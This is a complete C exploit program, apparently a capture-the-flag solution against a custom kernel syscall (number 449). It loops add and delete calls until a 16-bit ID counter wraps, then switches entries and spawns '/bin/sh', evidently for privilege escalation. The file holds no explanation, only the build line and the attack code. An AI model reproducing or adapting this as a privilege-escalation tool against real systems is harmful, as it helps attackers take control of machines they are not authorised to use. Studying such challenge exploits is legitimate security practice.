//gcc -o exploit exploit.c -s -static

#include <unistd.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>

static unsigned short nextId = 0;

typedef enum {
    MAGIC_ADD = 0,
    MAGIC_EDIT = 1,
    MAGIC_DELETE = 2,
    MAGIC_SWITCH = 3,
} MagicMode;

int main() {
    //const char* message = "Hello, world!\n";
    //syscall(SYS_write, STDOUT_FILENO, message, 14);

    nextId = 1;
    for( int i = 0; i < 65536; i++ )
    {
	if( nextId == 65535 )
	{
	    syscall(449, MAGIC_ADD, "test", "test");
	    syscall(449, MAGIC_SWITCH, "test", "test");
	    system("/bin/sh");
	}
	else
	{
	    syscall(449, MAGIC_ADD, "test", "test");
	    syscall(449, MAGIC_DELETE, "test", "test");
	}
        nextId++;
    }

    return 0;
}
